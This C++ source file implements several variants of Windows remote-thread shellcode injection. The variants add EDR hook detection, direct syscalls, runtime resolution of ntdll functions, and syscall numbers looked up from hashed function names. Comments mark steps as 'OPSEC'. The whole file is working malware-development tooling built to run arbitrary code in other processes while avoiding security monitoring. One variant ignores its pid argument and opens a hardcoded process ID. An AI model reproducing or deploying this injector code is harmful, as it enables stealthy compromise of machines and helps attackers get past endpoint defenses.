/*****************************************************************************
 * @file        injectors.cpp
 * @author      Zied Sayari
 *
 * @details
 *  Remote Thread Injection Function Implementations
 *****************************************************************************/

#include "injectors.h"
#include "Utils.h"
#include "custom_types.h"
#include <Windows.h>
#include <iostream>


BOOL remote_thread_injection_v1(DWORD pid, const BYTE shellcode[], size_t shellcode_length) {


	HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (!process_handle) {
		puts("[-] Failed to open process");
		return FALSE;
	}

	printf("[+] Succesfully Obtained The Handle for the Proccess: 0x%p\n", (UINT_PTR)process_handle);

	// OPSEC only read_write access and change it later
	LPVOID shellcode_remote_address = VirtualAllocEx(process_handle, NULL, shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!shellcode_remote_address) {
		puts("[-] Failed to allocate memory for shellcode");
		return FALSE;
	}

	printf("[+] Succesfully Allocated the Remote Memory At 0x%p\n", shellcode_remote_address);

	BOOL success = WriteProcessMemory(process_handle, shellcode_remote_address, (LPCVOID)shellcode, shellcode_length, NULL);
	if (!success) {
		puts("[-] Failed to write shellcode into allocated memeory");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	DWORD old_protection = 0;
	success = VirtualProtectEx(process_handle, shellcode_remote_address, shellcode_length, PAGE_EXECUTE_READ, &old_protection);
	if (!success) {
		puts("[-] Failed to make the shellcode Executable");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}
	puts("[+] Succesfully Changed Protection of Remote Memory to be exectubale and readable\n");

	HANDLE new_thread = CreateRemoteThreadEx(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)shellcode_remote_address, NULL, 0, NULL, NULL);
	if (!new_thread) {
		puts("[-] Failed to create remote thread");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	CloseHandle(process_handle);
	puts("[+] Succesfully Injected shellcode into the remote Process!\n");
	return TRUE;
}


BOOL remote_thread_injection_v2(DWORD pid, const BYTE shellcode[], size_t shellcode_length) {


	HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (!process_handle) {
		puts("[-] Failed to open process");
		return FALSE;
	}

	printf("[+] Succesfully Obtained The Handle for the Proccess: 0x%p\n", (UINT_PTR)process_handle);

	// OPSEC only read_write access and change it later
	LPVOID shellcode_remote_address = VirtualAllocEx(process_handle, NULL, shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!shellcode_remote_address) {
		puts("[-] Failed to allocate memory for shellcode");
		return FALSE;
	}

	printf("[+] Succesfully Allocated the Remote Memory At 0x%p\n", shellcode_remote_address);

	BOOL success = WriteProcessMemory(process_handle, shellcode_remote_address, (LPCVOID)shellcode, shellcode_length, NULL);
	if (!success) {
		puts("[-] Failed to write shellcode into allocated memeory");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	DWORD old_protection = 0;
	success = VirtualProtectEx(process_handle, shellcode_remote_address, shellcode_length, PAGE_EXECUTE_READ, &old_protection);
	if (!success) {
		puts("[-] Failed to make the shellcode Executable");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}
	puts("[+] Succesfully Changed Protection of Remote Memory to be exectubale and readable\n");

	if (isHooked_call_chain_CreateRemoteThreadEx()) {
		puts("[-] Aborting The Operation.\n");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	HANDLE new_thread = CreateRemoteThreadEx(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)shellcode_remote_address, NULL, 0, NULL, NULL);
	if (!new_thread) {
		puts("[-] Failed to create remote thread");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	CloseHandle(process_handle);
	puts("[+] Succesfully Injected shellcode into the remote Process!\n");
	return TRUE;
}


BOOL remote_thread_injection_v3(DWORD pid, const BYTE shellcode[], size_t shellcode_length) {
	HANDLE process_handle = NULL;
	OBJECT_ATTRIBUTES object_attributes;
	InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);
	CLIENT_ID client_id = { 0 };
	client_id.UniqueProcess = (HANDLE)pid;
	client_id.UniqueThread = NULL;


	sys_NtOpenProcess(&process_handle, PROCESS_ALL_ACCESS, &object_attributes, &client_id);
	if (!process_handle) {
		puts("[-] Failed to open process");
		return FALSE;
	}

	printf("[+] Succesfully Obtained The Handle for the Proccess: 0x%p\n", (UINT_PTR)process_handle);

	// OPSEC only read_write access and change it later

	LPVOID shellcode_remote_address = NULL;
	sys_NtAllocateVirtualMemoryEx(process_handle, &shellcode_remote_address, &shellcode_length,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, 0);

	if (!shellcode_remote_address) {
		puts("[-] Failed to allocate memory for shellcode");
		CloseHandle(process_handle);
		return FALSE;
	}

	printf("[+] Succesfully Allocated the Remote Memory At 0x%p\n", shellcode_remote_address);

	NTSTATUS success = sys_NtWriteVirtualMemory(process_handle, (PVOID)shellcode_remote_address, (PVOID)shellcode, shellcode_length, NULL);

	if (success) {
		puts("[-] Failed to write shellcode into allocated memeory");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	DWORD old_protection = 0;

	success = sys_NtProtectVirtualMemory(process_handle, &shellcode_remote_address, &shellcode_length, PAGE_EXECUTE_READ, &old_protection);
	if (success) {
		puts("[-] Failed to make the shellcode Executable");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}
	puts("[+] Succesfully Changed Protection of Remote Memory to be exectubale and readable\n");

	HANDLE new_thread = NULL;
	sys_NTCreateThreadEx(&new_thread, THREAD_ALL_ACCESS, NULL, process_handle, (PUSER_THREAD_START_ROUTINE)shellcode_remote_address, NULL, FALSE, 0, 0, 0, NULL);
	if (!new_thread) {
		puts("[-] Failed to create remote thread");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	CloseHandle(process_handle);
	puts("[+] Succesfully Injected shellcode into the remote Process!\n");
	return TRUE;
}


BOOL remote_thread_injection_v2_2(DWORD pid, const BYTE shellcode[], size_t shellcode_length) {
	


	HANDLE process_handle = NULL;
	OBJECT_ATTRIBUTES object_attributes;
	InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);
	CLIENT_ID client_id = { 0 };
	client_id.UniqueProcess = (HANDLE)pid;
	client_id.UniqueThread = NULL;

	func_ptr_NtOpenProcess ptr_NtOpenProcess = (func_ptr_NtOpenProcess)get_win_api_func_addr("ntdll.dll", "NtOpenProcess");
	
	if (check_hook((LPVOID)ptr_NtOpenProcess, "NtOpenProcess")) {
		puts("[-] Aborting The Operation.\n");
		return FALSE;
	}

	ptr_NtOpenProcess(&process_handle, PROCESS_ALL_ACCESS, &object_attributes, &client_id);
	if (!process_handle) {
		puts("[-] Failed to open process");
		return FALSE;
	}

	printf("[+] Succesfully Obtained The Handle for the Proccess: 0x%p\n", (UINT_PTR)process_handle);

	// OPSEC only read_write access and change it later
	func_ptr_NtAllocateVirtualMemoryEx ptr_NtAllocateVirtualMemoryEx = 
		(func_ptr_NtAllocateVirtualMemoryEx)get_win_api_func_addr("ntdll.dll", "NtAllocateVirtualMemoryEx");

	if (check_hook((LPVOID)ptr_NtAllocateVirtualMemoryEx, "NtAllocateVirtualMemoryEx")) {
		puts("[-] Aborting The Operation.\n");
		CloseHandle(process_handle);
		return FALSE;
	}

	LPVOID shellcode_remote_address = NULL;
	SIZE_T shellcode_size = shellcode_length;

	ptr_NtAllocateVirtualMemoryEx(process_handle, &shellcode_remote_address, &shellcode_size, 
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, 0);

	if (!shellcode_remote_address) {
		puts("[-] Failed to allocate memory for shellcode");
		CloseHandle(process_handle);
		return FALSE;
	}

	printf("[+] Succesfully Allocated the Remote Memory At 0x%p\n", shellcode_remote_address);

	func_ptr_NtWriteVirtualMemory ptr_NtWriteVirtualMemory =
		(func_ptr_NtWriteVirtualMemory)get_win_api_func_addr("ntdll.dll", "NtWriteVirtualMemory");

	if (check_hook((LPVOID)ptr_NtWriteVirtualMemory, "NtWriteVirtualMemory")) {
		puts("[-] Aborting The Operation.\n");
		CloseHandle(process_handle);
		return FALSE;
	}

	NTSTATUS success = ptr_NtWriteVirtualMemory(process_handle, (PVOID)shellcode_remote_address, (PVOID)shellcode, shellcode_size, NULL);
	
	if (success) {
		puts("[-] Failed to write shellcode into allocated memeory");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	DWORD old_protection = 0;
	func_ptr_NtProtectVirtualMemory ptr_NtProtectVirtualMemory =
		(func_ptr_NtProtectVirtualMemory)get_win_api_func_addr("ntdll.dll", "NtProtectVirtualMemory");

	if (check_hook((LPVOID)ptr_NtProtectVirtualMemory, "NtProtectVirtualMemory")) {
		puts("[-] Aborting The Operation.\n");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	success = ptr_NtProtectVirtualMemory(process_handle, &shellcode_remote_address, &shellcode_size, PAGE_EXECUTE_READ, &old_protection);
	if (success) {
		puts("[-] Failed to make the shellcode Executable");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}
	puts("[+] Succesfully Changed Protection of Remote Memory to be exectubale and readable\n");

	func_ptr_NtCreateThreadEx ptr_NtCreateThreadEx =
		(func_ptr_NtCreateThreadEx)get_win_api_func_addr("ntdll.dll", "NtCreateThreadEx");

	if (check_hook((LPVOID)ptr_NtCreateThreadEx, "NtCreateThreadEx")) {
		puts("[-] Aborting The Operation.\n");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	HANDLE new_thread = NULL;
	ptr_NtCreateThreadEx(&new_thread, THREAD_ALL_ACCESS, NULL, process_handle, (PUSER_THREAD_START_ROUTINE)shellcode_remote_address, NULL, FALSE, 0, 0, 0, NULL);
	if (!new_thread) {
		puts("[-] Failed to create remote thread");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	CloseHandle(process_handle);
	puts("[+] Succesfully Injected shellcode into the remote Process!\n");
	return TRUE;
}

BOOL remote_thread_injection_v4(DWORD pid, const BYTE shellcode[], size_t shellcode_length)
{

/*-----------------------GET_ntdll_base_address-------------------------------------------------*/

	PTEB ptr_current_teb = RtlGetPeb();
	PPEB ptr_current_peb = ptr_current_teb->ProcessEnvironmentBlock;
	if (!ptr_current_peb || !ptr_current_teb || ptr_current_peb->OSMajorVersion != 0xA)
		return -1;

	PLDR_DATA_TABLE_ENTRY ptr_ntdll_data_table_entry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)ptr_current_peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
	PVOID ntdll_base_address = ptr_ntdll_data_table_entry->DllBase;

/*-----------------------GET_IMAGE_EXPORT_DIRECTORY_address-------------------------------------------------*/

	PIMAGE_EXPORT_DIRECTORY ptr_ntdll_export_directory = get_image_export_directory(ntdll_base_address);
	if (!ptr_ntdll_export_directory) {
		return FALSE;
	}

	XX_TABLE table = { 0 };

/*-----------------------CALL_NtOpenProcess----------------------------------------------------*/

	table.NtOpenProcess.hashed_function_name = 0xEF3E996A487EBDB2;
	if (!get_ssn(ntdll_base_address, ptr_ntdll_export_directory, &table.NtOpenProcess)) {
		puts("[-] Failed to get the SSN for NtOpenProcess");
		return EXIT_FAILURE;
	}
	printf("[+] SSN for NtOpenProcess : 0x%02X\n", table.NtOpenProcess.SSN);

	set_ssn(table.NtOpenProcess.SSN);

	HANDLE process_handle = NULL;
	OBJECT_ATTRIBUTES object_attributes = { 0 };
	InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);
	CLIENT_ID client_id = { 0 };
	client_id.UniqueProcess = (HANDLE)10916;
	client_id.UniqueThread = NULL;
	((func_ptr_NtOpenProcess)&invoke_syscall)(&process_handle, PROCESS_ALL_ACCESS, &object_attributes, &client_id);
	if (!process_handle) {
		puts("[-] Failed to open process");
		return FALSE;
	}
	printf("[+] Succesfully Obtained The Handle for the Proccess: 0x%p\n\n", (UINT_PTR)process_handle);

/*-----------------------CALL_NtAllocateVirtualMemory----------------------------------------------------*/

	table.NtAllocateVirtualMemory.hashed_function_name = 0x012832E586E2EE3B;
	if (!get_ssn(ntdll_base_address, ptr_ntdll_export_directory, &table.NtAllocateVirtualMemory)) {
		puts("[-] Failed to get the SSN for NtAllocateVirtualMemory");
		return EXIT_FAILURE;
	}
	printf("[+] SSN for NtAllocateVirtualMemory : 0x%02X\n", table.NtAllocateVirtualMemory.SSN);

	
	set_ssn(table.NtAllocateVirtualMemory.SSN);

	LPVOID shellcode_remote_address = NULL;
	// OPSEC only read_write access and change it later
	((func_ptr_NtAllocateVirtualMemoryEx)&invoke_syscall)(process_handle, &shellcode_remote_address, &shellcode_length,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, 0);
	if (!shellcode_remote_address) {
		puts("[-] Failed to allocate memory for shellcode");
		CloseHandle(process_handle);
		return FALSE;
	}
	printf("[+] Succesfully Allocated the Remote Memory At 0x%p\n\n", shellcode_remote_address);

/*-----------------------CALL_NtWriteVirtualMemory----------------------------------------------------*/

	table.NtWriteVirtualMemory.hashed_function_name = 0x6D2645851279A77F;
	if (!get_ssn(ntdll_base_address, ptr_ntdll_export_directory, &table.NtWriteVirtualMemory)) {
		puts("[-] Failed to get the SSN for NtWriteVirtualMemory");
		return EXIT_FAILURE;
	}
	printf("[+] SSN for NtWriteVirtualMemory : 0x%02X\n", table.NtWriteVirtualMemory.SSN);

	// OPSEC only read_write access and change it later
	set_ssn(table.NtWriteVirtualMemory.SSN);

	NTSTATUS status = ((func_ptr_NtWriteVirtualMemory)&invoke_syscall)(process_handle, (PVOID)shellcode_remote_address, (PVOID)shellcode, shellcode_length, NULL);
	if (status) {
		puts("[-] Failed to write shellcode into allocated memeory");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	printf("[+] Succesfully Written The Shellcode Into Remote Memory.\n\n");
	
/*-----------------------CALL_NtProtectVirtualMemory----------------------------------------------------*/

	table.NtProtectVirtualMemory.hashed_function_name = 0x41ED8C006473677F;
	if (!get_ssn(ntdll_base_address, ptr_ntdll_export_directory, &table.NtProtectVirtualMemory)) {
		puts("[-] Failed to get the SSN for NtProtectVirtualMemory");
		return EXIT_FAILURE;
	}
	printf("[+] SSN for NtProtectVirtualMemory : 0x%02X\n", table.NtProtectVirtualMemory.SSN);

	// OPSEC only read_write access and change it later
	set_ssn(table.NtProtectVirtualMemory.SSN);

	DWORD old_protection = 0;
	status = ((func_ptr_NtProtectVirtualMemory)&invoke_syscall)(process_handle, &shellcode_remote_address, &shellcode_length, PAGE_EXECUTE_READ, &old_protection);
	if (status) {
		puts("[-] Failed to make the shellcode Executable");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}
	
	puts("[+] Succesfully Changed Protection of Remote Memory to be exectubale and readable\n\n");

/*-----------------------CALL_NtCreateThreadEx----------------------------------------------------*/

	table.NtCreateThreadEx.hashed_function_name = 0x2AE08CDE2CDF73CF;
	if (!get_ssn(ntdll_base_address, ptr_ntdll_export_directory, &table.NtCreateThreadEx)) {
		puts("[-] Failed to get the SSN for NtCreateThreadEx");
		return EXIT_FAILURE;
	}
	printf("[+] SSN for NtCreateThreadEx : 0x%02X\n", table.NtCreateThreadEx.SSN);

	// OPSEC only read_write access and change it later
	set_ssn(table.NtCreateThreadEx.SSN);

	HANDLE new_thread = NULL;
	status = ((func_ptr_NtCreateThreadEx)&invoke_syscall)(&new_thread, THREAD_ALL_ACCESS, NULL, process_handle, (PUSER_THREAD_START_ROUTINE)shellcode_remote_address, NULL, FALSE, 0, 0, 0, NULL);
	if (!new_thread) {
		puts("[-] Failed to create remote thread");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	CloseHandle(process_handle);
	puts("[+] Succesfully Injected shellcode into the remote Process!\n\n");
	return TRUE;
}

BOOL remote_thread_injection_v2_1(DWORD pid, const BYTE shellcode[], size_t shellcode_length)
{
	HANDLE process_handle = NULL;
	OBJECT_ATTRIBUTES object_attributes;
	InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);
	CLIENT_ID client_id = { 0 };
	client_id.UniqueProcess = (HANDLE)pid;
	client_id.UniqueThread = NULL;

	func_ptr_NtOpenProcess ptr_NtOpenProcess = (func_ptr_NtOpenProcess)get_win_api_func_addr("ntdll.dll", "NtOpenProcess");

	ptr_NtOpenProcess(&process_handle, PROCESS_ALL_ACCESS, &object_attributes, &client_id);
	if (!process_handle) {
		puts("[-] Failed to open process");
		return FALSE;
	}

	printf("[+] Succesfully Obtained The Handle for the Proccess: 0x%p\n", (UINT_PTR)process_handle);

	// OPSEC only read_write access and change it later
	func_ptr_NtAllocateVirtualMemoryEx ptr_NtAllocateVirtualMemoryEx =
		(func_ptr_NtAllocateVirtualMemoryEx)get_win_api_func_addr("ntdll.dll", "NtAllocateVirtualMemoryEx");

	LPVOID shellcode_remote_address = NULL;

	ptr_NtAllocateVirtualMemoryEx(process_handle, &shellcode_remote_address, &shellcode_length,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, 0);

	if (!shellcode_remote_address) {
		puts("[-] Failed to allocate memory for shellcode");
		CloseHandle(process_handle);
		return FALSE;
	}

	printf("[+] Succesfully Allocated the Remote Memory At 0x%p\n", shellcode_remote_address);

	func_ptr_NtWriteVirtualMemory ptr_NtWriteVirtualMemory =
		(func_ptr_NtWriteVirtualMemory)get_win_api_func_addr("ntdll.dll", "NtWriteVirtualMemory");

	NTSTATUS success = ptr_NtWriteVirtualMemory(process_handle, (PVOID)shellcode_remote_address, (PVOID)shellcode, shellcode_length, NULL);

	if (success) {
		puts("[-] Failed to write shellcode into allocated memeory");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	DWORD old_protection = 0;
	func_ptr_NtProtectVirtualMemory ptr_NtProtectVirtualMemory =
		(func_ptr_NtProtectVirtualMemory)get_win_api_func_addr("ntdll.dll", "NtProtectVirtualMemory");

	success = ptr_NtProtectVirtualMemory(process_handle, &shellcode_remote_address, &shellcode_length, PAGE_EXECUTE_READ, &old_protection);
	if (success) {
		puts("[-] Failed to make the shellcode Executable");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}
	puts("[+] Succesfully Changed Protection of Remote Memory to be exectubale and readable\n");

	func_ptr_NtCreateThreadEx ptr_NtCreateThreadEx =
		(func_ptr_NtCreateThreadEx)get_win_api_func_addr("ntdll.dll", "NtCreateThreadEx");


	HANDLE new_thread = NULL;
	ptr_NtCreateThreadEx(&new_thread, THREAD_ALL_ACCESS, NULL, process_handle, (PUSER_THREAD_START_ROUTINE)shellcode_remote_address, NULL, FALSE, 0, 0, 0, NULL);
	if (!new_thread) {
		puts("[-] Failed to create remote thread");
		VirtualFreeEx(process_handle, shellcode_remote_address, 0, MEM_RELEASE);
		CloseHandle(process_handle);
		return FALSE;
	}

	CloseHandle(process_handle);
	puts("[+] Succesfully Injected shellcode into the remote Process!\n");
	return TRUE;
}
